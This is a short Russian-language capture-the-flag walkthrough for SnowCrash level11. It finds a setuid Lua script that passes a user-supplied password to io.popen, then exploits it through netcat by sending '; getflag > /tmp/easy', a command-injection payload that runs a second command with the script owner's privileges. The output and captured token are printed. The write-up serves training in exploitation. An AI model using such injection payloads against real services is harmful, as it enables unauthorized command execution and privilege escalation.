level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
Видим, что есть suid

Запустив, видмим, что порт уже используется из чего делаем вывод, что скрипт уже запущен
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?

Открыв файл level11.lua и изучив содержимое, находим в нем строчку:

prog = io.popen("echo "..pass.." | sha1sum", "r")

Исходя из документации :
io.open (filename [, mode])

io.popen (prog [, mode])

Запускает программу prog в отдельном процессе и возвращает хендлер файла, который вы можете
использовать для чтения данных из этой программы (если mode равен "r", значение по умолчанию)
или для записи данных в эту программу (если mode равен "w").

Так как данная функция запускает программу, а на файле стоит suid, значит нам просто нужно дать строку, которая выполнит getflag

level11@SnowCrash:~$ nc localhost 5151
Password: ; getflag > /tmp/easy

level11@SnowCrash:~$ cat /tmp/easy
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
